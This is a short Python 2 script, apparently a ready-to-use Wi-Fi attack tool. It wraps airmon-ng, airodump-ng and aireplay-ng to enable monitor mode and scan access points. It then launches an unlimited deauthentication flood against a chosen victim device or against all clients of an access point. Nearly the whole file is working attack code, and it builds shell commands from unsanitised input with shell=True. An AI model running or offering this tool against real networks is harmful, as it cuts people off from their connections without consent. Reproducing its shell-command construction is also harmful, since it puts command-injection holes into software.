import subprocess
import os

def main():
    os.system("iwconfig")
    adapter = raw_input("[+] Enter adapter's name: ")
    enableMonitor(adapter)
    capture(adapter)

    ap = raw_input("[+] Enter AP's mac: ")
    channel = raw_input("[+] Enter channel: ")
    dump(ap,channel,adapter)
    victim = raw_input("[+] Enter victim's mac (enter 0 for no specific target) : ")
    deauth(ap,victim,adapter)

def enableMonitor(adapter):
    try:
        print "[+] Enabling monitor's mode.."
        os.system("airmon-ng start " + adapter)
    except:
        print "[-] Error trying to enable monitor mode at ", adapter
        exit()

def capture(adapter):
    try:
        adapterMon = adapter + 'mon'
        data = subprocess.call("airodump-ng "+adapterMon,shell=True)
        print data
    except(KeyboardInterrupt):
        pass
def dump(ap,channel,adapter):
    try:
        adapterMon = adapter + 'mon'
        dumping = subprocess.call("airodump-ng -d "+ap+ " -c "+channel+" "+adapterMon,shell=True)
        print dumping
    except(KeyboardInterrupt):
        pass

def deauth(ap,victim,adapter):
    try:
        adapterMon = adapter + 'mon'
        if victim != "0":
            attack = subprocess.call("aireplay-ng -0 0 -a "+ ap +" -c "+ victim +" "+adapterMon,shell=True)
        if victim == "0":
            attack = subprocess.call("aireplay-ng -0 0 -a "+ ap +" "+adapterMon,shell=True)
        print attack
    except(KeyboardInterrupt):
        os.system("clear")
        print "[+] attack stopped.."
        os.system("airmon-ng stop "+adapterMon)

main()
